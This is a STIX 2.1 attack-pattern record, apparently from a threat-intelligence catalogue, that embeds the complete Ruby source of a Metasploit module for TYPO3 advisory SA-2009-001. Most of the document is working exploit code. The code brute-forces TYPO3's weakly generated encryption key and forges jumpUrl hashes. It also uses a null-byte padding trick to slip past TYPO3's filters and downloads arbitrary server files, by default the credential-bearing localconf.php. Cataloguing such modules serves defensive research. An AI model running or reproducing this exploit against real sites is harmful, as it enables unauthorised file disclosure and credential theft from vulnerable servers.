{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0c4fedca-6981-4566-9cd4-95948162209f",
    "created": "2024-08-14T16:23:16.703106Z",
    "modified": "2024-08-14T16:23:16.703111Z",
    "name": "TYPO3 sa-2009-001 Weak Encryption Key File Disclosure",
    "description": " This module exploits a flaw in TYPO3 encryption ey creation process to allow for file disclosure in the jumpUrl mechanism. This flaw can be used to read any file that the web server user account has access to view.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/typo3_sa_2009_001.rb",
            "external_id": "typo3_sa_2009_001.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.c22.cc/advisories/typo3-sa-2009-001"
        },
        {
            "source_name": "reference",
            "url": "http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-001/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'TYPO3 sa-2009-001 Weak Encryption Key File Disclosure',\n      'Description' => %q{\n        This module exploits a flaw in TYPO3 encryption ey creation process to allow for\n        file disclosure in the jumpUrl mechanism. This flaw can be used to read any file\n        that the web server user account has access to view.\n      },\n      'References' => [\n        ['CVE', '2009-0255'],\n        ['OSVDB', '51536'],\n        ['URL', 'http://blog.c22.cc/advisories/typo3-sa-2009-001'],\n        ['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-001/'],\n      ],\n      'DisclosureDate' => 'Jan 20 2009',\n      'Author' => [ 'Chris John Riley' ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('URI', [true, 'TYPO3 Path', '/']),\n        OptString.new('RFILE', [true, 'The remote file to download', 'typo3conf/localconf.php']),\n        OptString.new('ENC_KEY', [false, 'Encryption key if known', '']),\n      ]\n    )\n  end\n\n  def enc_key(seed)\n    if datastore['ENC_KEY'] != ''\n      final = datastore['ENC_KEY']\n      print_status('Using provided Encryption Key')\n    else\n      # build the encrption key to check\n      seed = seed.to_s\n      rnd1 = Digest::MD5.hexdigest(seed)\n      rnd2 = Digest::MD5.hexdigest(rnd1)\n      rnd3 = Digest::MD5.hexdigest(rnd1 + rnd2)\n      final = rnd1 + rnd2 + rnd3\n    end\n\n    return final\n  end\n\n  def run\n    # Add padding to bypass TYPO3 security filters\n    #\n    # Null byte fixed in PHP 5.3.4\n    #\n\n    uri = normalize_uri(datastore['URI'])\n    case datastore['RFILE']\n    when nil\n      # Nothing\n    when /localconf\\.php$/i\n      jumpurl = \"#{datastore['RFILE']}%00/.\"\n      jumpurl_len = jumpurl.length - 2 # Account for difference in length with null byte\n      jumpurl_enc = jumpurl.sub('%00', \"\\00\") # Replace %00 with \\00 to correct null byte format\n      print_status(\"Adding padding to end of #{datastore['RFILE']} to avoid TYPO3 security filters\")\n    when %r{^\\.\\.(/|\\\\)}i\n      print_error('Directory traversal detected... you might want to start that with a /.. or \\\\..')\n    else\n      jumpurl_len = datastore['RFILE'].length\n      jumpurl = datastore['RFILE'].to_s\n      jumpurl_enc = datastore['RFILE'].to_s\n    end\n\n    print_status(\"Establishing a connection to #{rhost}:#{rport}\")\n    print_status(\"Trying to retrieve #{datastore['RFILE']}\")\n    print_status('Rotating through possible weak encryption keys')\n\n    for i in (0..1000)\n\n      final = enc_key(i)\n\n      locationData = Rex::Text.rand_text_numeric(1) + '::' + Rex::Text.rand_text_numeric(2)\n      juarray = \"a:3:{i:0;s:#{jumpurl_len}:\\\"#{jumpurl_enc}\\\"\"\n      juarray << \";i:1;s:#{locationData.length}:\\\"#{locationData}\\\"\"\n      juarray << \";i:2;s:#{final.length}:\\\"#{final}\\\";}\"\n\n      juhash = Digest::MD5.hexdigest(juarray)\n      juhash = juhash[0..9] # shortMD5 value for use as juhash\n\n      uri_base_path = normalize_uri(uri, '/index.php')\n\n      file_uri = \"#{uri_base_path}?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}\"\n      vprint_status(\"Checking Encryption Key [#{i}/1000]: #{final}\")\n\n      begin\n        file = send_request_raw({\n          'uri' => file_uri,\n          'method' => 'GET',\n          'headers' =>\n          {\n            'Connection' => 'Close'\n          }\n        }, 25)\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      rescue ::Timeout::Error, ::Errno::EPIPE => e\n        print_error(e.message)\n      end\n\n      case file.headers['Content-Type']\n      when 'text/html'\n        case file.body\n        when 'jumpurl Secure: \"' + datastore['RFILE'] + '\" was not a valid file!'\n          print_error(\"File #{datastore['RFILE']} does not exist.\")\n          print_good(\"Discovered encryption key : #{final}\")\n          return\n        when 'jumpurl Secure: locationData, ' + locationData + ', was not accessible.'\n          print_error(\"File #{datastore['RFILE']} is not accessible.\")\n          print_good(\"Discovered encryption key : #{final}\")\n          return\n        when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'\n          print_error(\"File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.\")\n          print_good(\"Discovered encryption key : #{final}\")\n          return\n        end\n      when 'application/octet-stream'\n        addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB\n        print_good(\"Discovered encryption key : #{final}\")\n        print_good('Writing local file ' + File.basename(datastore['RFILE'].downcase) + ' to loot')\n        store_loot('typo3_' + File.basename(datastore['RFILE'].downcase), 'text/xml', addr, file.body, 'typo3_' + File.basename(datastore['RFILE'].downcase), 'Typo3_sa_2009_001')\n        return\n      else\n        if datastore['ENC_KEY'] != ''\n          print_error('Encryption Key specified is not correct')\n          return\n        else\n          # Try next encryption key\n        end\n      end\n    end\n\n    print_error(\"#{rhost}:#{rport} [Typo3-SA-2009-001] Failed to retrieve file #{datastore['RFILE']}\")\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Chris John Riley ]",
        ""
    ],
    "x_mitre_disclosure_date": "Jan 20 2009"
}